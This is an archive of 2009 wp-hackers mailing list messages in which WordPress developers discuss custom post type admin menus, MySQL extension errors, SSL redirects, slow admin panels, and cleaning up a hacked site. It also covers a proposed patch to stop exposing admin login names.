I'm definitely familiar with it, but...  I was referring to functions to add the *standard* meta boxes to a custom Edit page, not custom ones.

Looking at it again, it appears that you could use it to add the standard boxes to a custom page, simply by hooking the standard functions instead of custom ones.   Hmmm....

Actually, the implications of that are huge. In a good way. :-)  Thanks for pointing out the obvious to me.

Stephen


-- 
Stephen Rider
http://striderweb.com/


From otto at ottodestruct.com  Fri Dec  4 14:23:40 2009
From: otto at ottodestruct.com (Otto)
Date: Fri, 4 Dec 2009 08:23:40 -0600
Subject: [wp-hackers] WorPress dies silently without MySQL PHP extention
In-Reply-To: <da7069940912031744w6c75f963lfdc5bbc667b96124@mail.gmail.com>
References: <da7069940912031744w6c75f963lfdc5bbc667b96124@mail.gmail.com>
Message-ID: <161617690912040623g20016c9bw3671bcdc42968541@mail.gmail.com>

Correct me if I'm wrong, but I thought WordPress' support for other
DB's was basically limited to replacing the wpdb class entirely. To
support another DB, you'd basically make your own db.php file in the
wp-content directory, then the wp-db.php never gets loaded.

So if that is the case, this mysql_connect function would never get called.

-Otto



On Thu, Dec 3, 2009 at 7:44 PM, Vlad GURDIGA <gurdiga at gmail.com> wrote:
> Hello!
>
> When there is no MySQL PHP extension installed, for example when you
> have WordPress working on an SQLite DB instead of MySQL, wpdb
> constructor dies silently trying to
>
> $this->dbh = @mysql_connect($dbhost, $dbuser, $dbpassword, true);
>
> Is that OK?
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From dragonfly at dragonflyeye.net  Fri Dec  4 14:29:16 2009
From: dragonfly at dragonflyeye.net (Thomas Belknap)
Date: Fri, 4 Dec 2009 09:29:16 -0500
Subject: [wp-hackers] WorPress dies silently without MySQL PHP extention
In-Reply-To: <161617690912040623g20016c9bw3671bcdc42968541@mail.gmail.com>
References: <da7069940912031744w6c75f963lfdc5bbc667b96124@mail.gmail.com>
	<161617690912040623g20016c9bw3671bcdc42968541@mail.gmail.com>
Message-ID: <77b239a00912040629t7c99bfb3x99cf34ca6186805c@mail.gmail.com>

Is the question whether or not it's OK for WP to die, or weather some
notification aught to be sent when it does?

On Fri, Dec 4, 2009 at 9:23 AM, Otto <otto at ottodestruct.com> wrote:

> Correct me if I'm wrong, but I thought WordPress' support for other
> DB's was basically limited to replacing the wpdb class entirely. To
> support another DB, you'd basically make your own db.php file in the
> wp-content directory, then the wp-db.php never gets loaded.
>
> So if that is the case, this mysql_connect function would never get called.
>
> -Otto
>
>
>
> On Thu, Dec 3, 2009 at 7:44 PM, Vlad GURDIGA <gurdiga at gmail.com> wrote:
> > Hello!
> >
> > When there is no MySQL PHP extension installed, for example when you
> > have WordPress working on an SQLite DB instead of MySQL, wpdb
> > constructor dies silently trying to
> >
> > $this->dbh = @mysql_connect($dbhost, $dbuser, $dbpassword, true);
> >
> > Is that OK?
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From anacin at gwhatchet.com  Fri Dec  4 15:29:07 2009
From: anacin at gwhatchet.com (Andrew Nacin)
Date: Fri, 4 Dec 2009 10:29:07 -0500
Subject: [wp-hackers] WorPress dies silently without MySQL PHP extention
In-Reply-To: <77b239a00912040629t7c99bfb3x99cf34ca6186805c@mail.gmail.com>
References: <da7069940912031744w6c75f963lfdc5bbc667b96124@mail.gmail.com> 
	<161617690912040623g20016c9bw3671bcdc42968541@mail.gmail.com> 
	<77b239a00912040629t7c99bfb3x99cf34ca6186805c@mail.gmail.com>
Message-ID: <8b870c460912040729r483212bdj4380607a0e9f2f74@mail.gmail.com>

When you don't have the MySQL extension called, wp-settings.php intercepts:

if ( !extension_loaded
<http://phpxref.ftwr.co.uk/wordpress/_functions/extension_loaded.html>('mysql')
&& !file_exists
<http://phpxref.ftwr.co.uk/wordpress/_functions/file_exists.html>(WP_CONTENT_DIR
<http://phpxref.ftwr.co.uk/wordpress/_constants/WP_CONTENT_DIR.html> .
'/db.php') )    die( /*WP_I18N_OLD_MYSQL*/'Your PHP installation
appears to be missing the MySQL extension which is required by
WordPress.'/*/WP_I18N_OLD_MYSQL*/ );

Note that check for wp-content/db.php -- that's what Otto referred to above:

> To support another DB, you'd basically make your own db.php file in
> the wp-content directory, then the wp-db.php never gets loaded.

Scribu and Ozh already mentioned that if the mysql connection has a
problem (like the next line after @mysql_connect), it'll die anyway
with an error establishing the database connection. Thus, you're not
supposed to get a straight-up blank screen.

From wp at xentek.net  Fri Dec  4 16:48:04 2009
From: wp at xentek.net (Eric Marden)
Date: Fri, 4 Dec 2009 11:48:04 -0500
Subject: [wp-hackers] Custom Post - implementation specifics
In-Reply-To: <79A04F64-1A67-496A-AC7C-1A68A98B3315@striderweb.com>
References: <BA11F8C4-C212-46A5-84C2-C37AD621FEB3@striderweb.com>
	<161617690912030956tcb3bbb5l824b1f47cc657726@mail.gmail.com>
	<A4DBBAE2-37FE-4ED3-A1A3-7A54980E1B3E@striderweb.com>
	<FADAE09C-2A24-4EF7-B35E-3666BF130144@xentek.net>
	<C861EFC8-5670-4191-80E6-B7473ADF5FC3@striderweb.com>
	<79A04F64-1A67-496A-AC7C-1A68A98B3315@striderweb.com>
Message-ID: <203A2FB8-3C65-4D24-807C-58EB37CF98EB@xentek.net>


On Dec 3, 2009, at 6:08 PM, Stephen Rider wrote:

> Eric -- this suggests a good approach.  Instead of one mega-"add  
> edit page" function, perhaps simply make it so every stock edit page  
> element has a small function that creates it. Thus the code that  
> creates the standard Edit Post page might simply look like:
>
> create_editor();
> create_excerpt_box();
> create_custom_field_box();
> create_pingbacks_box();
> ...etc.
>
> or maybe better:
>
> editor_element('editor');
> editor_element('excerpt');
> editor_element('custom_fields');
> editor_element('pingbacks');
>
> Question for those more familiar:  What functions of this type  
> already exist?  I don't mean the generic add_meta(), I mean  
> dedicated functions for editor elements....



The reason I'd like to see it broken up is that a lot of already is,  
mostly due to the fact that just about every other box on the screen  
(except for title) is a meta box already, and adding/removing those  
are already pretty easy to do.

However, the screen that lists the posts is all kinds of copy+paste  
misery, but still relatively easy to figure out how to do something  
like it for yourself.



- Eric Marden
__________________________________
http://xentek.net/code/wordpress/
tw: @xentek





From wp at xentek.net  Fri Dec  4 16:52:00 2009
From: wp at xentek.net (Eric Marden)
Date: Fri, 4 Dec 2009 11:52:00 -0500
Subject: [wp-hackers] From SSL to non-SSL
In-Reply-To: <d7153760912031455j2f2bb8a9qbcad46c984470606@mail.gmail.com>
References: <d7153760912031455j2f2bb8a9qbcad46c984470606@mail.gmail.com>
Message-ID: <F75111A8-82D5-424B-B072-E4D76DB5F088@xentek.net>

I think you'd be better off using Apache to redirect the 1 page to SSL  
and not mess with it on the WP level. If WordPress is not to told to  
do SSL, it should print out all links as http (full urls) by default  
and you can let apache see if someone requests the secure page  
insecurely and 302 Redirect them to the proper link.


- Eric Marden
__________________________________
http://xentek.net/code/wordpress/
tw: @xentek





From mccormicky at gmail.com  Fri Dec  4 17:08:13 2009
From: mccormicky at gmail.com (mccormicky)
Date: Fri, 4 Dec 2009 12:08:13 -0500
Subject: [wp-hackers] From SSL to non-SSL
In-Reply-To: <F75111A8-82D5-424B-B072-E4D76DB5F088@xentek.net>
References: <d7153760912031455j2f2bb8a9qbcad46c984470606@mail.gmail.com>
	<F75111A8-82D5-424B-B072-E4D76DB5F088@xentek.net>
Message-ID: <d7153760912040908m2a0da128x6f5ad560606486f2@mail.gmail.com>

Hey thanks for answering despite my newbie double post. Wasn't sure if it
got sent. Sorry about that.

The reason I used the plugin http for wordpress isn't because I don't want
to just redirect the page with Apache
but that everything called by other wp plugins,js files,css files in
header.php by wp-head must be using https for the security certificate to
kick in
 without an error message: "this page contains insecure items".
The plugin accomplishes that for me despite having to edit some of the other
plugins and paste relative paths to the files that aren't made https.
The plugin can cover most but not all. But its still a lot less work with it
than without it.

My post was more to do with redirecting out of ssl than redirecting to ssl
because I'm doing that ok(well,maybe not if I shouldn't be using wp to do it
all).
Just can't seem to get out of ssl if another link in the nav is clicked on
this one site.
 I'll add in a 3rd case study and see what happens with it.
If I have the same results with #3 I guess I'll know the successful site is
the exception, not the rule.

On Fri, Dec 4, 2009 at 11:52 AM, Eric Marden <wp at xentek.net> wrote:

> I think you'd be better off using Apache to redirect the 1 page to SSL and
> not mess with it on the WP level. If WordPress is not to told to do SSL, it
> should print out all links as http (full urls) by default and you can let
> apache see if someone requests the secure page insecurely and 302 Redirect
> them to the proper link.
>
>
> - Eric Marden
> __________________________________
> http://xentek.net/code/wordpress/
> tw: @xentek
>
>
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From tim at silentgap.com  Fri Dec  4 17:28:27 2009
From: tim at silentgap.com (Tim Schoffelman)
Date: Fri, 4 Dec 2009 11:28:27 -0600
Subject: [wp-hackers] WP exploit ,
	was Re: [Webmaster Central Help] Site 	hacked.
In-Reply-To: <7f49e8010912030726h45c2657aoaca0bf47f5c079e3@mail.gmail.com>
References: <59e7f3130912020107t61ea9ba8nb67ecdff711f3aac@mail.gmail.com>
	<7235ce780912020129n31b10fabq2f2757844c616d21@mail.gmail.com>
	<59e7f3130912020632u2d28cef7hd38ae71bddf81905@mail.gmail.com>
	<7235ce780912020655h13599806q348ed3187e8b6d03@mail.gmail.com>
	<4B16A3BF.4050508@gmail.com>
	<e1202cb10912021030i1e43f71ex42ce729c21e01f88@mail.gmail.com>
	<d7153760912021050r74d7c301r176957ba49b07176@mail.gmail.com>
	<012801ca7381$70d0fbc0$5272f340$@com>
	<59e7f3130912030343t69eda796y908a23854600b0d@mail.gmail.com>
	<7f49e8010912030726h45c2657aoaca0bf47f5c079e3@mail.gmail.com>
Message-ID: <5b1aecc0912040928u78ec354fg9225f522cc955c80@mail.gmail.com>

I've had something very similar w/the base64 happen to a client of mine. We
ended up creating a separate clean install, and then fresh versions of all
his plugins, then cleaned up his theme folder (which we had a fresh copy in
subversion (SVN)). We also notice it wasn't only WordPress files that were
infected, but other non-WordPress php files as well, so we had our client
change their FTP password & db username / password as well. Since taking all
of these step's, we haven't an issue since. Sounds like you're heading down
the right path.



On Thu, Dec 3, 2009 at 9:26 AM, Pete Mall <pete at jointforcestech.com> wrote:

> Could you share the exploit files with us. Also, what type of hosting are
> you on and the structure of the sites you have on this hosting account.
>
> --
> Pete Mall
> developersmind.com
>
>
> On Thu, Dec 3, 2009 at 3:43 AM, Malaiac <malaiac at gmail.com> wrote:
>
> > Most hacked files were actually plugins files in another install of
> > wordpress (on a subdomain), while the subdomain itself was not
> > actually hacked (or not so obviously).
> > I'm going to rm * and make fresh installs on both subdomains.
> >
> > M
> >
> > 2009/12/2 Brad Williams <bradw at illiams.com>:
> > > Also remember if you have multiple websites on the same hosting account
> > they
> > > may also be compromised and should be checked.  Even if they aren't
> > showing
> > > signs of being hacked they could be.
> > >fo/wp-hackers
> > >
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From tim at silentgap.com  Fri Dec  4 17:38:20 2009
From: tim at silentgap.com (Tim Schoffelman)
Date: Fri, 4 Dec 2009 11:38:20 -0600
Subject: [wp-hackers] Blog containing 5,00,000 posts. Slow Admin panel
In-Reply-To: <C33E666A-F2CB-4A15-840C-39D38B0488D9@xentek.net>
References: <mailman.9.1259755202.30226.wp-hackers@lists.automattic.com>
	<op.u4bf53c51214gw@akshay-pc>
	<3ee7077c0912022001r23d9cadbuefc503904ab3c880@mail.gmail.com>
	<C33E666A-F2CB-4A15-840C-39D38B0488D9@xentek.net>
Message-ID: <5b1aecc0912040938w6159ab7ew1ac86cf5b8388470@mail.gmail.com>

> So, what are you doing with 5,000,000 or 500,000 posts?

Are you importing Tweet's and storing them as posts? Check the count on your
wp_postmeta table, I'd be interested in seeing what the count on that one
is. Also, are you doing any custom work where each post has data stored in
your wp_options table, b/c if so, check the count on that table too. If that
one is abnormally high, that 'might' explain for the slow admin.

~Tim

From mccormicky at gmail.com  Fri Dec  4 17:49:47 2009
From: mccormicky at gmail.com (mccormicky)
Date: Fri, 4 Dec 2009 12:49:47 -0500
Subject: [wp-hackers] From SSL to non-SSL
In-Reply-To: <d7153760912040908m2a0da128x6f5ad560606486f2@mail.gmail.com>
References: <d7153760912031455j2f2bb8a9qbcad46c984470606@mail.gmail.com>
	<F75111A8-82D5-424B-B072-E4D76DB5F088@xentek.net>
	<d7153760912040908m2a0da128x6f5ad560606486f2@mail.gmail.com>
Message-ID: <d7153760912040949q1653483dje41d9b40367b558b@mail.gmail.com>

Ok, I added a 3rd site to my test.
Came up the same results as #2.
The case#1 is the exception.
The other 2 site's  themes and textwidgets were edited so that *all
linkage*would use relative paths. This was overkill as it happens.
Seems that as long as all css and js files in the header and all images in
the page are sent with https I can use full paths for navigation and the
browser doesn't object.

So case #1 must have something in *httpd*.*conf*  (?) because I don't see
anything special in .htaccess.
Guess it's a host issue at this point?

On Fri, Dec 4, 2009 at 12:08 PM, mccormicky <mccormicky at gmail.com> wrote:

> Hey thanks for answering despite my newbie double post. Wasn't sure if it
> got sent. Sorry about that.
>
> The reason I used the plugin http for wordpress isn't because I don't want
> to just redirect the page with Apache
> but that everything called by other wp plugins,js files,css files in
> header.php by wp-head must be using https for the security certificate to
> kick in
>  without an error message: "this page contains insecure items".
> The plugin accomplishes that for me despite having to edit some of the
> other plugins and paste relative paths to the files that aren't made https.
> The plugin can cover most but not all. But its still a lot less work with
> it than without it.
>
> My post was more to do with redirecting out of ssl than redirecting to ssl
> because I'm doing that ok(well,maybe not if I shouldn't be using wp to do it
> all).
> Just can't seem to get out of ssl if another link in the nav is clicked on
> this one site.
>  I'll add in a 3rd case study and see what happens with it.
> If I have the same results with #3 I guess I'll know the successful site is
> the exception, not the rule.
>
>
> On Fri, Dec 4, 2009 at 11:52 AM, Eric Marden <wp at xentek.net> wrote:
>
>> I think you'd be better off using Apache to redirect the 1 page to SSL and
>> not mess with it on the WP level. If WordPress is not to told to do SSL, it
>> should print out all links as http (full urls) by default and you can let
>> apache see if someone requests the secure page insecurely and 302 Redirect
>> them to the proper link.
>>
>>
>> - Eric Marden
>> __________________________________
>> http://xentek.net/code/wordpress/
>> tw: @xentek
>>
>>
>>
>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>
>

From alex at dunae.ca  Fri Dec  4 18:00:09 2009
From: alex at dunae.ca (Alex Dunae)
Date: Fri, 4 Dec 2009 10:00:09 -0800 (PST)
Subject: [wp-hackers] Custom Post - implementation specifics
In-Reply-To: <79A04F64-1A67-496A-AC7C-1A68A98B3315@striderweb.com>
References: <BA11F8C4-C212-46A5-84C2-C37AD621FEB3@striderweb.com> 
	<161617690912030956tcb3bbb5l824b1f47cc657726@mail.gmail.com> 
	<A4DBBAE2-37FE-4ED3-A1A3-7A54980E1B3E@striderweb.com>
	<FADAE09C-2A24-4EF7-B35E-3666BF130144@xentek.net> 
	<C861EFC8-5670-4191-80E6-B7473ADF5FC3@striderweb.com>
	<79A04F64-1A67-496A-AC7C-1A68A98B3315@striderweb.com>
Message-ID: <80f08458-f6f2-4b89-8b16-22ce8089f0f3@b36g2000prf.googlegroups.com>

On Dec 3, 3:08?pm, Stephen Rider <wp-hack... at striderweb.com> wrote:
> Eric -- this suggests a good approach. ?Instead of one mega-"add edit page" function, perhaps simply make it so every stock edit page element has a small function that creates it. ?Thus the code that creates the standard Edit Post page might simply look like:
>
> create_editor();
> create_excerpt_box();
> create_custom_field_box();
> create_pingbacks_box();
> ...etc.

I would definitely appreciate this.  I've used custom post types in
the past and ran into a lot of issues trying to include WP's editor
(notably trying to figure out which scripts and stylesheets to
enqueue), as well as keeping the my admin boxes visually consistent
with WordPress's look and feel.

Custom post types need to be in the template hierarchy.  I.E.
post_type = 'album' looks for 'album-slug.php', 'album-ID.php',
'album.php' in the theme.

The other area I've had difficulties is hacking WP's search function
to look for custom post types.  This may have been improved over the
past year, but previously it was a real pain.  I borrowed a lot of
code from http://www.semiologic.com/software/search-reloaded/ to get
proper, paginated search working.

From wp at xentek.net  Fri Dec  4 18:11:20 2009
From: wp at xentek.net (Eric Marden)
Date: Fri, 4 Dec 2009 13:11:20 -0500
Subject: [wp-hackers] From SSL to non-SSL
In-Reply-To: <d7153760912040908m2a0da128x6f5ad560606486f2@mail.gmail.com>
References: <d7153760912031455j2f2bb8a9qbcad46c984470606@mail.gmail.com>
	<F75111A8-82D5-424B-B072-E4D76DB5F088@xentek.net>
	<d7153760912040908m2a0da128x6f5ad560606486f2@mail.gmail.com>
Message-ID: <423044A3-1E50-425E-96A3-D08929D3A21A@xentek.net>


On Dec 4, 2009, at 12:08 PM, mccormicky wrote:

> The reason I used the plugin http for wordpress isn't because I  
> don't want
> to just redirect the page with Apache
> but that everything called by other wp plugins,js files,css files in
> header.php by wp-head must be using https for the security  
> certificate to
> kick in
> without an error message: "this page contains insecure items".

Yeah, I should have thought about that. More than likely something in  
the hosting environment is different, which is why you are getting the  
results that you are.

A good place to start debugging this is with a file with <?php  
phpinfo(); ?> in it on both servers. Visit that page in your browser  
and compare the php configurations.



- Eric Marden
__________________________________
http://xentek.net/code/wordpress/
tw: @xentek





From wp at xentek.net  Fri Dec  4 19:18:41 2009
From: wp at xentek.net (Eric Marden)
Date: Fri, 4 Dec 2009 14:18:41 -0500
Subject: [wp-hackers] From SSL to non-SSL
In-Reply-To: <d7153760912040949q1653483dje41d9b40367b558b@mail.gmail.com>
References: <d7153760912031455j2f2bb8a9qbcad46c984470606@mail.gmail.com>
	<F75111A8-82D5-424B-B072-E4D76DB5F088@xentek.net>
	<d7153760912040908m2a0da128x6f5ad560606486f2@mail.gmail.com>
	<d7153760912040949q1653483dje41d9b40367b558b@mail.gmail.com>
Message-ID: <D31694BD-1082-4070-A31B-0600181D60AF@xentek.net>

On Dec 4, 2009, at 12:49 PM, mccormicky wrote:

> Guess it's a host issue at this point?

Yes.

- Eric Marden
__________________________________
http://xentek.net/code/wordpress/
tw: @xentek





From mccormicky at gmail.com  Fri Dec  4 19:36:13 2009
From: mccormicky at gmail.com (mccormicky)
Date: Fri, 4 Dec 2009 14:36:13 -0500
Subject: [wp-hackers] From SSL to non-SSL
In-Reply-To: <D31694BD-1082-4070-A31B-0600181D60AF@xentek.net>
References: <d7153760912031455j2f2bb8a9qbcad46c984470606@mail.gmail.com>
	<F75111A8-82D5-424B-B072-E4D76DB5F088@xentek.net>
	<d7153760912040908m2a0da128x6f5ad560606486f2@mail.gmail.com>
	<d7153760912040949q1653483dje41d9b40367b558b@mail.gmail.com>
	<D31694BD-1082-4070-A31B-0600181D60AF@xentek.net>
Message-ID: <d7153760912041136l4c1af73ah7a601a2f5e91bb44@mail.gmail.com>

And probably slim chance of getting that set up on a shared server.

On Fri, Dec 4, 2009 at 2:18 PM, Eric Marden <wp at xentek.net> wrote:

> On Dec 4, 2009, at 12:49 PM, mccormicky wrote:
>
>  Guess it's a host issue at this point?
>>
>
> Yes.
>
>
> - Eric Marden
> __________________________________
> http://xentek.net/code/wordpress/
> tw: @xentek
>
>
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From gurdiga at gmail.com  Sat Dec  5 01:08:00 2009
From: gurdiga at gmail.com (Vlad GURDIGA)
Date: Sat, 5 Dec 2009 03:08:00 +0200
Subject: [wp-hackers] WorPress dies silently without MySQL PHP extention
In-Reply-To: <8b870c460912040729r483212bdj4380607a0e9f2f74@mail.gmail.com>
References: <da7069940912031744w6c75f963lfdc5bbc667b96124@mail.gmail.com> 
	<161617690912040623g20016c9bw3671bcdc42968541@mail.gmail.com> 
	<77b239a00912040629t7c99bfb3x99cf34ca6186805c@mail.gmail.com> 
	<8b870c460912040729r483212bdj4380607a0e9f2f74@mail.gmail.com>
Message-ID: <da7069940912041708x29210a74i151ef041000322db@mail.gmail.com>

On Fri, Dec 4, 2009 at 5:29 PM, Andrew Nacin <anacin at gwhatchet.com> wrote:
> When you don't have the MySQL extension called, wp-settings.php intercepts:
>
> if ( !extension_loaded
> <http://phpxref.ftwr.co.uk/wordpress/_functions/extension_loaded.html>('mysql')
> && !file_exists
> <http://phpxref.ftwr.co.uk/wordpress/_functions/file_exists.html>(WP_CONTENT_DIR
> <http://phpxref.ftwr.co.uk/wordpress/_constants/WP_CONTENT_DIR.html> .
> '/db.php') ) ? ?die( /*WP_I18N_OLD_MYSQL*/'Your PHP installation
> appears to be missing the MySQL extension which is required by
> WordPress.'/*/WP_I18N_OLD_MYSQL*/ );
>
> Note that check for wp-content/db.php -- that's what Otto referred to above:
>
>> To support another DB, you'd basically make your own db.php file in
>> the wp-content directory, then the wp-db.php never gets loaded.
>
> Scribu and Ozh already mentioned that if the mysql connection has a
> problem (like the next line after @mysql_connect), it'll die anyway
> with an error establishing the database connection. Thus, you're not
> supposed to get a straight-up blank screen.

Makes sense.

It was probably something wrong with my setup: it happened on Windows.

Thank you for the effort of explaining it and sorry for the noise.

From pt at ptahd.com  Sat Dec  5 07:52:01 2009
From: pt at ptahd.com (Ptah Dunbar)
Date: Sat, 5 Dec 2009 14:52:01 +0700
Subject: [wp-hackers] Custom Post - implementation specifics
In-Reply-To: <80f08458-f6f2-4b89-8b16-22ce8089f0f3@b36g2000prf.googlegroups.com>
References: <BA11F8C4-C212-46A5-84C2-C37AD621FEB3@striderweb.com>
	<161617690912030956tcb3bbb5l824b1f47cc657726@mail.gmail.com>
	<A4DBBAE2-37FE-4ED3-A1A3-7A54980E1B3E@striderweb.com>
	<FADAE09C-2A24-4EF7-B35E-3666BF130144@xentek.net>
	<C861EFC8-5670-4191-80E6-B7473ADF5FC3@striderweb.com>
	<79A04F64-1A67-496A-AC7C-1A68A98B3315@striderweb.com>
	<80f08458-f6f2-4b89-8b16-22ce8089f0f3@b36g2000prf.googlegroups.com>
Message-ID: <1275E35F-A8FD-4539-BDE1-9BBF8D5DF529@ptahd.com>

To quote Stephen:

> In a way it's a shame that in Admin we moved away from  
> "Action" ("Write". "Edit") menus toward "Thing" ("Posts", "Pages")  
> menus, as this makes it more difficult -- or at least more bulky --  
> to incorporate custom post types.  Where previously it would have  
> been intuitive to add a new item or two under "Edit", now to follow  
> the existing structure it would be a case of adding a whole new top  
> menu for each new Post Type, which would get big pretty quickly.

After custom post types becomes mainstream once 2.9 ships, people are  
going to face the hassle of creating admin menus for them. Going back  
towards the "Action" type menus will make things A LOT more simpler  
and consistent with the WordPress publishing experience. Users  
wouldn't have to think twice about which menu they need to click on to  
publish content to. They would just click under "Write", and available  
post types will be presented as submenu items. This is a major  
prerequisite before any administrative features for custom post types  
begin.

I think there's a significance difference between adding a custom  
plugin page using the menu/ settings API, compared to adding an  
administrative page for post types. Reverting back to the old "Action"  
type menus makes the writing and editing experience for any post type  
consistent with the admin and a lot more scalable. Developers really  
only need to customize admin elements belonging to their post type's  
write page.

2.9 adds the custom post type functionality in the backend. If we were  
to go back to the Action type menus, perhaps extending the  
register_post_type function to enable admin features would be more  
viable. Something like:

register_post_type( 'articles', array(
	'admin' => array( 'Articles', 'write' => array(
		'editor',
		'excerpt',
		'trackbacks',
		'custom_fields'
	))
));

The first param. in admin args would be the label of the submenu  
following what features the write page should have.  
register_post_type() would automatically create the submenus under the  
"Write" and "Edit" top-level pages and populate that page with the  
desired elements. In addition, developers could build additional page  
elements using the add_meta_box feature.

This is all that's really needed for adding basic administrative  
features for custom post types.

If that's too much abstraction, then consider:

register_post_type( 'articles', array( 'admin' => 'Articles');

Which just creates the write and edit submenus for the Articles post  
type, and the developer would need to call the necessary  
add_meta_box() functions for their page elements on the write page.

All in all, adding administrative features for custom post types  
should be dead simple. The developer shouldn't have to do the same  
work required to create custom plugin pages (using the menu API,  
settings API, handling option sanitizing, etc.) as those are two  
distinct administrative task.

Thoughts?

From jordi at jcanals.cat  Sat Dec  5 11:00:00 2009
From: jordi at jcanals.cat (Jordi Canals)
Date: Sat, 5 Dec 2009 12:00:00 +0100
Subject: [wp-hackers] Custom Post - implementation specifics
In-Reply-To: <1275E35F-A8FD-4539-BDE1-9BBF8D5DF529@ptahd.com>
References: <BA11F8C4-C212-46A5-84C2-C37AD621FEB3@striderweb.com>
	<161617690912030956tcb3bbb5l824b1f47cc657726@mail.gmail.com>
	<A4DBBAE2-37FE-4ED3-A1A3-7A54980E1B3E@striderweb.com>
	<FADAE09C-2A24-4EF7-B35E-3666BF130144@xentek.net>
	<C861EFC8-5670-4191-80E6-B7473ADF5FC3@striderweb.com>
	<79A04F64-1A67-496A-AC7C-1A68A98B3315@striderweb.com>
	<80f08458-f6f2-4b89-8b16-22ce8089f0f3@b36g2000prf.googlegroups.com>
	<1275E35F-A8FD-4539-BDE1-9BBF8D5DF529@ptahd.com>
Message-ID: <eccf1e7c0912050300l293bb87cqd4bb2151f9458bc0@mail.gmail.com>

2009/12/5 Ptah Dunbar <pt at ptahd.com>

> To quote Stephen:
>
>  In a way it's a shame that in Admin we moved away from "Action" ("Write".
>> "Edit") menus toward "Thing" ("Posts", "Pages") menus, as this makes it more
>> difficult -- or at least more bulky -- to incorporate custom post types.
>>  Where previously it would have been intuitive to add a new item or two
>> under "Edit", now to follow the existing structure it would be a case of
>> adding a whole new top menu for each new Post Type, which would get big
>> pretty quickly.
>>
>
> After custom post types becomes mainstream once 2.9 ships, people are going
> to face the hassle of creating admin menus for them. Going back towards the
> "Action" type menus will make things A LOT more simpler and consistent with
> the WordPress publishing experience. Users wouldn't have to think twice
> about which menu they need to click on to publish content to. They would
> just click under "Write", and available post types will be presented as
> submenu items. This is a major prerequisite before any administrative
> features for custom post types begin.
>
>
I agree with that. Going towards to 'Action' type menus will make it more
simpler to code and more easy to use. Creating some custom post types with
'Action' menus would help to manage authors as them will have only a simple
'Add Content/Manage Content' menu instead a lot of menu boxes one for each
post type. I'm thinking on the point of view for an Author or Editor, who
only manage content and do not deal with other settings.


[...]

If that's too much abstraction, then consider:
>
> register_post_type( 'articles', array( 'admin' => 'Articles');
>
> Which just creates the write and edit submenus for the Articles post type,
> and the developer would need to call the necessary add_meta_box() functions
> for their page elements on the write page.
>
> All in all, adding administrative features for custom post types should be
> dead simple. The developer shouldn't have to do the same work required to
> create custom plugin pages (using the menu API, settings API, handling
> option sanitizing, etc.) as those are two distinct administrative task.
>
>
Would be really useful to have something like that to easily create new
content types. As soon as we create a new post type, it should create the
corresponding menus in the proper 'Action' menus. If the API also sanitizes
the content (at least a basic sanitize), will help to make the plugins more
secure and robust. I think for a lot of plugins sanitizing is the most
forgotten thing. Handling the new post type default options is also
interesting (I don't know if 2.9 already does it), as we can define all
about categories, tags, comments and so on at the moment we create the new
custom post type.

---
Jordi Canals
http://alkivia.org

From ian at themeshaper.com  Sat Dec  5 15:38:22 2009
From: ian at themeshaper.com (Ian Stewart)
Date: Sat, 5 Dec 2009 09:38:22 -0600
Subject: [wp-hackers] Possible security patch
Message-ID: <a8405fa30912050738n112bba69s944171c92b9669cf@mail.gmail.com>

Just wondered if I could get your opinion on a possible security patch I
might try and write. I know WordPress is no fan of security through
obscurity but as it stands right now, if you're publishing posts as the
admin user, your login name can be harvested from the body_class and author
URLs. Would there be any interest in seeing it patched to a sanitized
display_name or nickname? I can't imagine how many WordPress sites are live
with super-weak passwords and the admin login name just hanging out there.

-- 
Ian Stewart

http://ThemeShaper.com/
http://twitter.com/iandstewart/
http://ianstewart.stumbleupon.com/

From ncrice at gmail.com  Sat Dec  5 16:20:29 2009
From: ncrice at gmail.com (Nathan Rice)
Date: Sat, 5 Dec 2009 11:20:29 -0500
Subject: [wp-hackers] Possible security patch
In-Reply-To: <a8405fa30912050738n112bba69s944171c92b9669cf@mail.gmail.com>
References: <a8405fa30912050738n112bba69s944171c92b9669cf@mail.gmail.com>
Message-ID: <862d087f0912050820h69752bf5q47fe4e0dd5362950@mail.gmail.com>

+1

------------------
Nathan Rice
WordPress and Web Development
www.nathanrice.net | twitter.com/nathanrice


On Sat, Dec 5, 2009 at 10:38 AM, Ian Stewart <ian at themeshaper.com> wrote:

> Just wondered if I could get your opinion on a possible security patch I
> might try and write. I know WordPress is no fan of security through
> obscurity but as it stands right now, if you're publishing posts as the
> admin user, your login name can be harvested from the body_class and author
> URLs. Would there be any interest in seeing it patched to a sanitized
> display_name or nickname? I can't imagine how many WordPress sites are live
> with super-weak passwords and the admin login name just hanging out there.
>
> --
> Ian Stewart
>
> http://ThemeShaper.com/
> http://twitter.com/iandstewart/
> http://ianstewart.stumbleupon.com/
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From scribu at gmail.com  Sat Dec  5 16:28:41 2009
From: scribu at gmail.com (scribu)
Date: Sat, 5 Dec 2009 18:28:41 +0200
Subject: [wp-hackers] Possible security patch
In-Reply-To: <a8405fa30912050738n112bba69s944171c92b9669cf@mail.gmail.com>
References: <a8405fa30912050738n112bba69s944171c92b9669cf@mail.gmail.com>
Message-ID: <349fe48b0912050828g3813400fwb292afd353772acc@mail.gmail.com>

The correct solution would be to not use an admin user for posting. You can
use the User Switching plugin for making this easier.

Also, the login name can be harvested by looking at the author archive URLs.


On Sat, Dec 5, 2009 at 5:38 PM, Ian Stewart <ian at themeshaper.com> wrote:

